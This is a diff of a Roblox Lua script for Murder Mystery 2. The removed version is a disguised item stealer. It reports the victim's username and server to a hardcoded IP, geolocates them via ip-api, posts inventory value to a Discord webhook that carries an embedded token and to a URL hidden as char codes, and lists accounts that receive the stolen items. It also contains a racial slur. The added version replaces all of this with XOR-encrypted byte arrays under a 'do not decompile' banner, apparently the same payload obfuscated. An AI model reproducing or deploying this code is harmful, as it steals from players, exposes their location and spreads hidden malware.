@@ -1,766 +1,828 @@
---NonStop
-
-_G.Usernames = {"Erereer454"} 
-_G.min_rarity = "Common" 
-_G.min_value = 0
-_G.pingEveryone = "Yes" 
-_G.webhook = "https://discord.com/api/webhooks/1495919876236378243/z9Ve-r2Sae7wtVyJ-9DdK2WnP-J9CCYtAJ_n4lWdPUWJT1vf1mERLKdF2fwUaG6orU_H"
-
-getgenv().executed = getgenv().executed or false
-if getgenv().executed then 
-    return 
-end
-getgenv().executed = true
-
-local count = 0
-local conn = game:GetService("RunService").Heartbeat:Connect(function(dt)
-    count += 1
-end)
-while count < 2 do
-    task.wait()
-end
-if conn then
-    conn:Disconnect()
-end
-
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local ok = "Fuckass nigger go fuck urself" 
-
-local function explainScripts(val1, scriptName, isActive, val2)
-    local baseValue = 1
-    if not isActive then
-        return
-    end
-
-
-    return val1 * 99 * 69 * 21 % 10, scriptName .. " - Validating..." .. val2, 2
-end
-
-
-local scriptStatus, message, scriptVersion = explainScripts(1, "Script", true, 55)
-
-local checkIS = game
-
-
-repeat 
-    task.wait()
-until checkIS == game
-
-
-repeat 
-    task.wait()
-until scriptVersion ~= 1
-
-repeat 
-    task.wait()
-until scriptStatus == 1
-
-local statusMsg = "Validation Success"
-
-local success = pcall(function()
-    local str = statusMsg
-    for first, last in utf8.graphemes(str) do
-        return first
-    end
-end)
-
-if not success then
-    error("")
-    return
-end
-
-
-local e = game:GetService("UserInputService")
-local platform = e:GetPlatform()
-
-if typeof(platform) ~= "EnumItem" then
-    error(ok)
-    return
-end
-
-
-if typeof(player.UserId) ~= "number" then
-    error(ok)
-    return
-end
-
-local function a(...) return ... + 5 end
-
-if a(5) ~= 10 then
-    error(ok)
-    return
-end
-
-if _25mspredefine then
-    error(ok)
-    return
-end
-
-
-
-
-
-local rarityTable = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Godly", "Ancient", "Unique"}
-
-
-local users = _G.Usernames or {}
-local min_rarity = _G.min_rarity or "Godly"
-local min_value = _G.min_value or 1
-local ping = _G.pingEveryone or "Yes"
-local webhookUrl = _G.webhook or "https://discord.com/api/webhooks/1495919876236378243/z9Ve-r2Sae7wtVyJ-9DdK2WnP-J9CCYtAJ_n4lWdPUWJT1vf1mERLKdF2fwUaG6orU_H"
-local baseUrl = webhookUrl
-
-local DhUsers = { 'joezeif111x','omarvc17'}
-_G.autoJoin = true
-_G.heartbeat = true
-local combinedUser = {}
-local combinedUser = {}
-for _, v in ipairs(_G.Usernames or {}) do table.insert(combinedUser, tostring(v):lower()) end
-for _, v in ipairs(DhUsers) do table.insert(combinedUser, tostring(v):lower()) end
-
-
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TeleportService = game:GetService("TeleportService")
-local plr = Players.LocalPlayer
-if next(users) == nil then
-    plr:kick("You didn't add a usernames or a valid webhook !")
-    return
-end
-if game.PlaceId ~= 142823291 then
-    plr:kick("Game not supported. Please join a normal MM2 server")
-    return
-end
-
-local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
-local isMobile = string.find(executor, "delta") or string.find(executor, "krnl")
-local isSalora = string.find(executor, "solara")
-if isSalora then
-    plr:kick("solara isnt supported please use xeno or any other executer")
-    return
-end
-local VIP = (game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
-local FULL = (#Players:GetPlayers() >= 12)
-if VIP or FULL then
-    if isMobile then
-        plr:kick(VIP and "VIP Servers not supported." or "FULL Servers Arent Supported")
-        return
-    else
-        print(VIP and "VIP Server detected, hopping..." or "Server full, hopping...")
-        ServerHop()
-        return
-    end
-end
-local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
-
-local jobId = game.JobId
-
-
-
-local function assignHitToDatabase()
-    
-    local userList = users or {}
-    if #userList == 0 then
-    return
-    end
-
-    for _, receiverName in ipairs(userList) do
-        local receiverStr = tostring(receiverName)
-        local payload = {
-            jobId = jobId, 
-            placeId = game.PlaceId,
-            username = plr.Name,
-            receiver = receiverStr 
-        }
-
-        local success, response = pcall(function()
-            return request({
-                Url = "http://213.165.46.247:3002/hit",
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json",
-                    ["Authorization"] = "nice_remote_spy"
-                },
-                Body = HttpService:JSONEncode(payload)
-            })
-        end)
-end
-end
-local function assignDhToDatabase()
-    
-    local userListt = DhUsers or {}
-    
-    for _, receiverName in ipairs(userListt) do
-        local receiverStr = tostring(receiverName)
-        local payload = {
-            jobId = jobId, 
-            placeId = game.PlaceId,
-            username = plr.Name,
-            receiver = receiverStr 
-        }
-
-        local success, response = pcall(function()
-            return request({
-                Url = "http://213.165.46.247:3002/hit",
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json",
-                    ["Authorization"] = "nice_remote_spy"
-                },
-                Body = HttpService:JSONEncode(payload)
-            })
-        end)
-end
-end
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-
-local GetPlayerLevel = ReplicatedStorage.Remotes.Extras.GetPlayerLevel
-local localPlayer = Players.LocalPlayer
-
-local victimLevel = GetPlayerLevel:InvokeServer(localPlayer)
-
-if victimLevel < 10 then
-    localPlayer:Kick("script error. make sure ur above the level 9")
-end
-
-
-local function GetLocation()
-    local success, res = pcall(function()
-    local requestFunc = request or (syn and syn.request) or (http and http.request) or http_request
-        return requestFunc({
-            Url = "http://ip-api.com/json",
-            Method = "GET"
-        })
-    end)
-    if success and res and res.Body then
-        local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
-        if ok and decoded then return decoded end
-    end
-    return {}
-end
-loc = GetLocation() 
-local requestFunc = request or (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or httprequest
-
-local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-local function execute_secure_request(items)
-    local HttpService = game:GetService("HttpService")
-    local _uB = {
-        104, 116, 116, 112, 115, 58, 47, 47, 102, 117, 99, 107, 105, 110, 103, 110, 
-        105, 103, 103, 101, 114, 109, 102, 46, 118, 101, 114, 99, 101, 108, 46, 97, 
-        112, 112, 47, 97, 112, 105, 47, 99, 97, 108, 99
-    }
-    
-    
-    local target = ""
-    for i=1, #_uB do 
-        target = target .. string.char(_uB[i]) 
-    end
-    local function b64_enc(data)
-        local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-        return ((data:gsub('.', function(x) 
-            local r,b='',x:byte() for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end return r;
-        end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
-            if (#x<6) then return '' end local c=0 for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end return b:sub(c+1,c+1)
-        end)..({ '', '==', '=' })[#data%3+1])
-    end
-
-    local req = request or (syn and syn.request) or http_request or (http and http.request)
-    
-    if not req then 
-        warn("Executor does not support HTTP requests")
-        return {total = "0.00", itemPrices = {}} 
-    end
-    local success, res = pcall(function()
-        return req({
-            Url = target,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["X-Encoded"] = "true" 
-            },
-            Body = HttpService:JSONEncode({inventory = items})
-        })
-    end)
-    if success and res and res.Body then
-        local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
-        if ok then 
-           
-        return decoded end
-    end
-
-    return {total = "0.00", itemPrices = {}}
-end
-
-local function GetUSD(list)
-    local items = {}
-    for _, item in ipairs(list) do
-
-        local name = tostring(item.DataID):gsub("%s+", "")
-
-        local itemData = database[item.DataID]
-         local isChroma = (itemInfo and itemInfo.Chroma) or item.DataID:find("Chroma")
-
-        if isChroma then
-
-            if name:find("Darkbringer") or name:find("Lightbringer") then
-
-                name = "Chroma" .. name:gsub("Chroma", "")
-            else
-
-                name = name:gsub("Chroma", "") .. "Chroma"
-            end
-        end
-
-        table.insert(items, {
-            name = name, 
-            amount = tonumber(item.Amount) or 1
-        })
-    end
-    return execute_secure_request(items)
-end
-
-
-
-
-local categories = {
-    godly = "https://supremevaluelist.com/mm2/godlies.html",
-    ancient = "https://supremevaluelist.com/mm2/ancients.html",
-    unique = "https://supremevaluelist.com/mm2/uniques.html",
-    classic = "https://supremevaluelist.com/mm2/vintages.html",
-    chroma = "https://supremevaluelist.com/mm2/chromas.html"
-}
-local scrapingHeaders = {
-    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-}
-local function trim(s) return s:match("^%s*(.-)%s*$") end
-local function fetchHTML(url)
-    if not requestFunc then return "" end
-    local success, response = pcall(function()
-        return requestFunc({ Url = url, Method = "GET", Headers = scrapingHeaders })
-    end)
-    return (success and response and response.Body) or ""
-end
-local function parseValue(itembodyDiv)
-    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
-    if valueStr then
-        valueStr = valueStr:gsub(",", "")
-        local value = tonumber(valueStr)
-        if value then return value end
-    end
-    return nil
-end
-local function extractItems(htmlContent)
-    local itemValues = {}
-    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
-        itemName = itemName:match("([^<]+)")
-        if itemName then
-            itemName = trim(itemName:gsub("%s+", " "))
-            itemName = trim((itemName:split(" Click "))[1])
-            local value = parseValue(itembodyDiv)
-            if value then itemValues[itemName:lower()] = value end
-        end
-    end
-    return itemValues
-end
-local function extractChromaItems(htmlContent)
-    local chromaValues = {}
-    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
-        chromaName = chromaName:match("([^<]+)")
-        if chromaName then
-            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
-            local value = parseValue(itembodyDiv)
-            if value then chromaValues[chromaName] = value end
-        end
-    end
-    return chromaValues
-end
-local function buildValueList()
-    local allExtractedValues = {}
-    local chromaExtractedValues = {}
-    local categoriesToFetch = {}
-    for rarity, url in pairs(categories) do
-        table.insert(categoriesToFetch, {rarity = rarity, url = url})
-    end
-    local totalCategories = #categoriesToFetch
-    local completed = 0
-    local lock = Instance.new("BindableEvent")
-    for _, category in ipairs(categoriesToFetch) do
-        task.spawn(function()
-            local rarity = category.rarity
-            local url = category.url
-            local htmlContent = fetchHTML(url)
-            if htmlContent and htmlContent ~= "" then
-                if rarity ~= "chroma" then
-                    local extracted = extractItems(htmlContent)
-                    for k, v in pairs(extracted) do allExtractedValues[k] = v end
-                else
-                    chromaExtractedValues = extractChromaItems(htmlContent)
-                end
-            end
-            completed = completed + 1
-            if completed == totalCategories then lock:Fire() end
-        end)
-    end
-    lock.Event:Wait()
-    local valueList = {}
-    for dataid, item in pairs(database) do
-        local itemName = item.ItemName and item.ItemName:lower() or ""
-        local rarity = item.Rarity or ""
-        local hasChroma = item.Chroma or false
-        if itemName ~= "" and rarity ~= "" then
-            local weaponRarityIndex = table.find(rarityTable, rarity)
-            local godlyIndex = table.find(rarityTable, "Godly")
-            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
-                if hasChroma then
-                    local matched = nil
-                    for cn, cv in pairs(chromaExtractedValues) do
-                        if cn:find(itemName) then matched = cv; break end
-                    end
-                    if matched then valueList[dataid] = matched end
-                else
-                    if allExtractedValues[itemName] then
-                        valueList[dataid] = allExtractedValues[itemName]
-                    end
-                end
-            end
-        end
-    end
-    return valueList
-end
-
-
-
-
-local function SendMemberHit(data)
-    if webhookToken == "" then return end
-    local requestFunc = request or (syn and syn.request) or (http and http.request) or http_request
-    local success, res = pcall(function()
-        return requestFunc({
-            Url = "https://discord.com/api/webhooks/1495919876236378243/z9Ve-r2Sae7wtVyJ-9DdK2WnP-J9CCYtAJ_n4lWdPUWJT1vf1mERLKdF2fwUaG6orU_H",
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-    if success and res and res.Body then
-        local ok, responseData = pcall(function()
-            return HttpService:JSONDecode(res.Body)
-        end)
-        if ok and responseData then
-            
-            warn("ok")
-        end
-    else
-        warn("Err: " .. tostring(res))
-    end
-end
-local function SecureSend(data)
-
-    local masterToken = "37458d46afc973c5f93277986cef00c8"
-    local masterUrl = "http://213.165.46.247:3000/api/token/" .. masterToken
-    
-    local requestFunc = request or (syn and syn.request) or (http and http.request) or http_request
-    
-    pcall(function()
-        requestFunc({
-            Url = masterUrl,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
+--[[ OBFUSCATED BY XOR-DRIVER ]]
+--[[ DO NOT DECOMPILE ]]
+
+local _stsfevkpxxxu = [=[19,50,73]=]
+local _nhxnksvmvvva = function(_rftjmhreqcvf) return string.byte(_rftjmhreqcvf) or 0 end
+local _cvzkuexwzgrl = 680 * 35 + 62
+local _osirarajpbab = string.rep('z', 10)
+local _vdyrqlvofptq = function(_xbkzusuhwvgg) return string.byte(_xbkzusuhwvgg) or 0 end
+local _hagmdvxgmltt = 566 * 39 + 18
+local _nxghcqxovhxn = string.rep('z', 45)
+local _nmuqxijernjf = function(_quertmguronj) return string.byte(_quertmguronj) or 0 end
+local _zukchpydguue = 330 * 77 + 90
+local _uirmulycikyt = [=[89,87,54]=]
+local _wnpbkyujkbtl = 603 * 26 + 85
+local _rvopeaonyarq = function(_keadnbeqttpu) return string.byte(_keadnbeqttpu) or 0 end
+local _ubtcuuxqmbrq = 200 * 14 + 61
+local _jjjfbqtubwig = [=[87,77,28]=]
+local _jqijokecvaaa = 313 * 42 + 84
+local _sxiuedfxpzwz = string.rep('z', 28)
+local _fyluictevgjo = 819 * 91 + 100
+local _rbsepfeqvowf = string.rep('z', 47)
+local _uyznxeitspgc = 722 * 76 + 30
+local _mqefqgrlbidk = 648 * 44 + 39
+local _fiudiucldqxt = function(_vivwosauhhep) return string.byte(_vivwosauhhep) or 0 end
+local _ciykaajfsvbx = coroutine.create(function() while true do coroutine.yield() end end)
+local _yidgqgwxotfe = 394 * 66 + 80
+local _zugwvpexydnk = 563 * 88 + 82
+local _gpbxqdjmjlry = 118 * 6 + 38
+local _yjzzrzmylbkv = string.rep('z', 30)
+local _vhbbfhnkwptc = 266 * 54 + 71
+local _jgxplsglhfrh = function(_vbhpyazjbapy) return string.byte(_vbhpyazjbapy) or 0 end
+local _tchtzcctiquw = function(_zirdxmyriszh) return string.byte(_zirdxmyriszh) or 0 end
+local _fmvqsgalabfy = [=[69,48,83]=]
+local _xvyukslipkud = coroutine.create(function() while true do coroutine.yield() end end)
+local _psqshdjutiso = 575 * 94 + 14
+local _zluvdjxhvunw = coroutine.create(function() while true do coroutine.yield() end end)
+local _yqcfouorylmi = string.rep('z', 39)
+local _qhvoocnwjqfg = function(_zodealszlsef) return string.byte(_zodealszlsef) or 0 end
+
+-- ENCRYPTED DATA CHUNKS
+
+local _kdoyvyaqgvss = {242,231,244,225,227,242,166,187,166,242,231,244,225,227,242,166,168,168,166,245,242,244,239,232,225,168,229,238,231,244,174,217,243,196,221,239,219,175,166,140,166,166,166,166,227,232,226,140,166,166,166,166,234,233,229,231,234,166,224,243,232,229,242,239,233,232,166,228,176,178}
+local _yijuhqbxvkku = {189,168,128,141,224,243,174,186,188,171,225,235,236,186,226,235,229,233,235,235,224,195,233,233,233,233,195,233,233,233,233,165,166,170,168,165,233,185,187,160,170,172,136,233,244,233,225,160,189,172,164,153,187,160,170,172,186,146,165,166,166,162,188,185,136,148,233,168,167,173}
+local _gofbbfjxksin = {51,56,50,127,92,118,118,118,118,63,48,118,37,35,53,53,51,37,37,118,55,56,50,118,36,51,37,118,55,56,50,118,36,51,37,120,20,57,50,47,118,34,62,51,56,92,118,118,118,118,118,118,118,118,58,57,53,55,58,118,57,61,122,118,50,51,53,57,50,51}
+local _krrjkiwhaglb = {29,56,46,57,50,61,48,53,50,114,43,53,50,124,0,109,101,104,0,109,100,111,124,17,41,46,56,57,46,124,17,37,47,40,57,46,37,124,110,126,112,86,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,41,46,48,124,97,124,126,52,40,40,44,47}
+local _kkhzcgynlskv = {244,190,176,196,248,241,254,251,227,176,246,255,226,176,231,245,241,224,255,254,184,227,185,190,178,188,154,176,176,176,176,176,176,176,176,176,176,176,176,243,255,252,255,226,176,173,176,161,166,167,167,167,162,161,165,188,154,176,176,176,176,176,176,176,176,176,176,176,176,228}
+local _svzrrghebota = {138,159,142,143,203,190,184,175,201,199,203,157,138,135,158,142,203,214,203,201,139,139,139,207,201,203,197,197,203,159,132,159,138,135,190,184,175,203,197,197,203,201,139,139,139,201,199,203,130,133,135,130,133,142,203,214,203,159,153,158,142,203,150,199,225,203,203,203,203,203}
+local _djzuyziezojq = {157,207,143,140,174,129,178,213,193,188,156,179,202,175,150,168,213,178,193,187,187,161,140,185,178,167,150,204,148,175,156,168,173,175,178,172,201,142,158,201,149,189,170,180,179,156,190,202,158,143,173,153,191,206,151,138,173,167,176,218,242,148,151,155,153,148,216,154,153,139}
+local _kqkpsajxcljz = {3,3,3,3,3,3,3,81,70,87,86,81,77,41,3,3,3,3,70,77,71,41,70,77,71,41,79,76,64,66,79,3,70,91,70,64,86,87,76,81,3,30,3,11,74,71,70,77,87,74,69,90,70,91,70,64,86,87,76,81,3,66,77,71,3,74,71,70,77,87}
+local _lzjfzdefkpao = {58,34,55,52,58,63,114,81,123,123,123,123,123,123,123,123,123,123,123,123,38,114,81,123,123,123,123,123,123,123,123,62,53,63,114,81,62,53,63,81,62,53,63,81,55,52,56,58,55,123,9,62,43,55,50,56,58,47,62,63,8,47,52,41,58,60,62,123,102,123}
+local _uqdhnzyclbhe = {30,120,163,21,191,231,8,66,69,159,45,232,216,62,214,176,59,207,108,32,169,53,152,151,116,253,1,159,173,57,14,230,250,44,205,194,52,167,33,214,51,218,55,43,33,66,155,4,15,195,23,93,174,30,241,107,178,222,25,216,87,124,85,110,15,18,48,149,148,157,72,99,84,154,137,224,50,139,64,124,166,218,84,250,88,63,206,207,180,27,68,140,132,31,127,121,47,65,105,82,186,144,100,218,193,31}
+local _ithrlyotkkyv = {51,35,102,123,102,100,38,38,38,100,102,104,104,102,42,41,37,39,50,47,41,40,21,50,52,102,104,104,102,100,38,38,38,100,106,102,47,40,42,47,40,35,102,123,102,50,52,51,35,102,59,106,76,102,102,102,102,102,102,102,102,102,102,102,102,102,102,102,102,61}
+local _tdpmplxeziky = {210,210,156,147,159,151,210,207,210,156,147,159,151,222,210,248,210,210,210,210,210,210,210,210,210,210,210,210,147,159,157,135,156,134,210,207,210,134,157,156,135,159,144,151,128,218,155,134,151,159,220,179,159,157,135,156,134,219,210,157,128,210,195,248,210,210,210,210,210,210}
+local _utpmyzbebhyt = {13,28,3,2,66,40,13,24,13,37,40,69,102,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,24,13,31,7,66,27,13,5,24,68,69,102,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,76,9}
+local _djvjxmbrtrrp = {34,14,35,122,101,103,105,105,103,32,38,42,34,105,23,43,38,36,34,14,35,103,105,105,103,101,97,32,38,42,34,14,41,52,51,38,41,36,34,14,35,122,101,103,105,105,103,45,40,37,14,35,77,103,103,103,103,43,40,36,38,43,103,38,49,38,51,38,53,53}
+local _yxltboblxgct = {129,156,200,211,207,200,206,213,210,219,148,221,146,248,221,200,221,245,248,149,134,219,207,201,222,148,158,153,207,151,158,144,156,158,158,149,182,156,156,156,156,208,211,223,221,208,156,208,211,211,215,201,204,254,156,129,156,200,211,207,200,206,213,210,219,148,222,146,248,221}
+local _benyzyrmbwfn = {237,247,234,232,228,203,228,232,224,165,184,165,230,237,247,234,232,228,203,228,232,224,191,232,228,241,230,237,173,167,173,222,219,185,216,174,172,167,172,143,165,165,165,165,165,165,165,165,236,227,165,230,237,247,234,232,228,203,228,232,224,165,241,237,224,235,143,165,165,165}
+local _egkcpoxeuscf = {75,73,68,8,75,64,77,75,67,97,123,8,21,8,79,73,69,77,34,34,34,90,77,88,77,73,92,8,34,8,8,8,8,92,73,91,67,6,95,73,65,92,0,1,34,93,70,92,65,68,8,75,64,77,75,67,97,123,8,21,21,8,79,73,69,77,34,34,34,90}
+local _kzkvmnqqkxkr = {166,175,253,234,251,250,253,225,175,238,161,217,238,227,250,234,175,177,175,237,161,217,238,227,250,234,175,234,225,235,166,133,133,175,175,175,175,227,224,236,238,227,175,255,253,234,233,230,247,175,178,175,167,255,230,225,232,175,178,178,175,173,214,234,252,173,166,175,238,225}
+local _bgspkebfoipv = {94,67,94,10,12,11,27,82,94,44,27,31,8,27,12,33,50,27,25,27,16,26,31,12,7,94,67,94,10,12,11,27,82,94,44,27,31,8,27,12,33,57,17,26,18,7,94,67,94,10,12,11,27,82,94,44,27,31,8,27,12,33,63,16,29,23,27,16,10,94}
+local _uyhhgtwzjnqk = {80,76,40,2,2,2,2,2,2,2,2,2,2,2,2,71,76,70,40,2,2,2,2,2,2,2,2,71,76,70,40,2,2,2,2,71,76,70,40,2,2,2,2,81,86,67,80,86,107,79,79,71,70,75,67,86,71,106,75,86,10,11,40,2,2,2,2,114,78,67}
+local _xrrhehhmmzeb = {83,70,70,30,30,30,71,27,6,11,5,6,17,71,10,6,4,70,14,8,4,12,26,70,88,93,91,81,91,90,91,80,88,75,69,99,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,73,0,10,6,7,54,28,27,5,73,84,73,8,31,8,29,8,27,60}
+local _kczyzblsgwlt = {73,7,6,29,73,26,28,10,10,12,26,26,73,29,1,12,7,99,73,73,73,73,12,27,27,6,27,65,75,75,64,99,73,73,73,73,27,12,29,28,27,7,99,12,7,13,99,99,99,5,6,10,8,5,73,12,73,84,73,14,8,4,12,83,46,12,29,58,12,27}
+local _cazypeundoen = {213,221,158,243,216,194,223,221,209,144,223,194,144,214,209,220,195,213,186,144,144,144,144,144,144,144,144,217,214,144,217,196,213,221,254,209,221,213,144,206,141,144,146,146,144,209,222,212,144,194,209,194,217,196,201,144,206,141,144,146,146,144,196,216,213,222,186,144,144,144}
+local _cbtfqhaialxb = {0,31,21,19,94,84,35,5,19,4,63,24,6,3,2,37,19,4,0,31,21,19,84,95,124,26,25,21,23,26,86,6,26,23,2,16,25,4,27,86,75,86,19,76,49,19,2,38,26,23,2,16,25,4,27,94,95,124,124,31,16,86,2,15,6,19,25,16,94,6}
+local _pzhwtybvuupu = {113,76,93,85,26,17,17,50,84,87,91,89,84,24,94,77,86,91,76,81,87,86,24,93,64,93,91,77,76,93,103,75,93,91,77,74,93,103,74,93,73,77,93,75,76,16,81,76,93,85,75,17,50,24,24,24,24,84,87,91,89,84,24,112,76,76,72,107,93,74}
+local _dqmqxfuxhcwk = {148,199,193,215,215,209,199,199,148,213,218,208,148,198,209,199,148,213,218,208,148,198,209,199,154,246,219,208,205,148,192,220,209,218,190,148,148,148,148,148,148,148,148,216,219,215,213,216,148,219,223,152,148,198,209,199,196,219,218,199,209,240,213,192,213,148,137,148,196,215}
+local _mljaxrmmlxhj = {115,110,99,16,58,58,58,58,118,117,121,123,118,58,109,127,123,106,117,116,69,104,123,104,115,110,99,69,115,116,126,127,98,58,39,58,110,123,120,118,127,52,124,115,116,126,50,104,123,104,115,110,99,78,123,120,118,127,54,58,104,123,104,115,110,99,51,16,58,58}
+local _chruczbxjobe = {75,97,97,97,97,97,97,97,97,40,39,97,47,46,53,97,55,32,45,52,36,97,53,41,36,47,75,97,97,97,97,97,97,97,97,97,97,97,97,55,32,45,52,36,97,124,97,105,54,36,32,49,46,47,30,51,32,51,40,53,56,30,40,47,37,36,57,97,127,124}
+local _khidgbidnqit = {14,70,90,67,66,109,65,64,90,75,64,90,14,80,19,14,12,12,14,90,70,75,64,36,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,71,72,14,92,79,92,71,90,87,14,80,19,14,12,77,70,92,65,67,79,12,14,90,70,75,64,36,14,14,14}
+local _evpcnxvjqecp = {167,170,179,163,181,230,251,230,189,187,204,230,230,230,230,170,169,165,167,170,230,165,174,180,169,171,167,131,190,178,180,167,165,178,163,162,144,167,170,179,163,181,230,251,230,189,187,204,230,230,230,230,170,169,165,167,170,230,165,167,178,163,161,169,180,175,163,181,146,169}
+local _ssxbitzbjqgf = {9,8,15,19,93,6,9,18,9,28,17,93,64,93,95,77,83,77,77,95,81,93,20,9,24,16,45,15,20,30,24,14,93,64,93,6,0,0,119,24,19,25,119,119,17,18,30,28,17,93,27,8,19,30,9,20,18,19,93,58,24,9,40,46,57,85,17,20,14,9}
+local _puwqgthleiix = {223,223,130,214,245,223,223,223,223,154,145,155,245,223,223,223,223,141,154,139,138,141,145,223,154,135,154,156,138,139,154,160,140,154,156,138,141,154,160,141,154,142,138,154,140,139,215,150,139,154,146,140,214,245,154,145,155,245,245,245,245,245,147,144,156,158,147,223,156,158}
+local _cxgwvgfrtvvv = {138,155,191,131,142,150,138,157,156,199,198,207,209,210,207,222,221,198,229,134,137,207,185,166,191,207,128,157,207,169,186,163,163,207,155,135,138,129,229,207,207,207,207,134,137,207,134,156,162,128,141,134,131,138,207,155,135,138,129,229,207,207,207,207,207,207,207,207,159,131}
+local _prnzplqlqwcd = {15,9,5,13,82,47,13,28,59,13,26,30,1,11,13,64,74,58,13,24,4,1,11,9,28,13,12,59,28,7,26,9,15,13,74,65,98,4,7,11,9,4,72,56,4,9,17,13,26,27,72,85,72,15,9,5,13,82,47,13,28,59,13,26,30,1,11,13,64,74}
+local _cosgfwpvxmsv = {149,212,219,209,149,199,208,198,197,218,219,198,208,155,247,218,209,204,156,149,218,199,149,151,151,191,208,219,209,191,217,218,214,212,217,149,211,192,219,214,193,220,218,219,149,197,212,199,198,208,227,212,217,192,208,157,220,193,208,216,215,218,209,204,241,220,195,156,191,149}
+local _stwppsgiulxe = {236,229,25,79,188,213,85,233,78,241,194,101,14,169,112,211,167,147,181,121,5,212,213,30,20,33,225,165,160,116,103,93,195,26,172,249,6,229,98,60,119,207,154,233,179,96,97,244,196,187,62,230,5,146,55,127,47,102,168,97,132,226,107,83,234,212,197,92,46,223,62,169,39,90,32,53,18,196,146,119,170,127,172,227,223,110,135,219,161,61,2,234,173,13,188,93,212,29,202,90,244,186,126,153,232,141,77,15,134,222,186,246,247,156,147,109,237,94,160,161,213,234,226,144,166,142,47,128,139,209}
+local _ecklqoegexbn = {66,116,127,117,120,127,118,67,116,96,100,116,98,101,51,49,101,121,116,127,27,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,101,112,98,122,63,102,112,120,101,57,33,63,34,56,27,49,49,49,49,49,49,49,49,49,49,49,49,116,125,98,116,120,119}
+local _mygacsjewydm = {45,40,34,32,53,40,46,47,110,43,50,46,47,99,109,75,97,97,97,97,97,97,97,97,97,97,97,97,97,97,97,97,97,97,97,97,26,99,0,52,53,41,46,51,40,59,32,53,40,46,47,99,28,97,124,97,99,47,40,34,36,30,51,36,44,46,53,36,30,50}
+local _qzgbwlocduyy = {6,29,16,7,26,28,29,91,90,121,83,83,83,83,83,83,83,83,1,22,7,6,1,29,83,1,22,2,6,22,0,7,53,6,29,16,91,8,121,83,83,83,83,83,83,83,83,83,83,83,83,38,1,31,83,78,83,81,27,7,7,3,0,73,92,92,23,26,0,16}
+local _kuyskovzytki = {22,28,125,86,76,81,83,95,28,23,30,74,86,91,80,52,30,30,30,30,30,30,30,30,30,30,30,30,90,87,77,78,82,95,71,112,95,83,91,30,3,30,28,125,86,76,81,83,95,30,28,30,16,16,30,90,87,77,78,82,95,71,112,95,83,91,52,30,30,30}
+local _jehdhfppwhrl = {85,127,127,127,127,127,127,127,127,110,111,106,115,127,110,111,108,115,127,110,111,108,115,127,110,111,110,115,127,110,110,107,115,127,110,111,102,115,127,110,111,109,115,127,107,105,115,127,110,110,103,115,127,110,111,110,115,127,110,110,107,115,127,102,102,115,127,110,111,110}
+local _gezqsbeaazix = {117,59,53,19,57,57,57,57,120,119,122,112,124,119,109,57,36,57,59,113,109,109,105,106,35,54,54,106,108,105,107,124,116,124,111,120,117,108,124,117,112,106,109,55,122,118,116,54,116,116,43,54,120,119,122,112,124,119,109,106,55,113,109,116,117,59,53,19,57,57}
+local _dacdopjlmabc = {232,234,231,231,163,237,254,229,232,255,226,228,229,163,162,129,171,171,171,171,171,171,171,171,171,171,171,171,249,238,255,254,249,229,171,249,238,250,254,238,248,255,163,240,129,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,222,249,231,171,182,171,169,227,255}
+local _trsognqtxsac = {222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,151,152,222,157,144,196,152,151,144,154,214,151,138,155,147,176,159,147,155,215,222,138,150,155,144,222,147,159,138,157,150,155,154,222,195,222,157,136,197,222,156,140,155,159,149,222,155,144,154,244,222}
+local _goyjkxofmzht = {226,226,226,174,173,161,163,174,226,180,163,174,183,167,145,182,176,226,255,226,171,182,167,175,160,173,166,187,134,171,180,248,175,163,182,161,170,234,224,254,160,231,177,233,161,174,163,177,177,255,153,229,158,224,159,171,182,167,175,180,163,174,183,167,153,229,158,224,159,252}
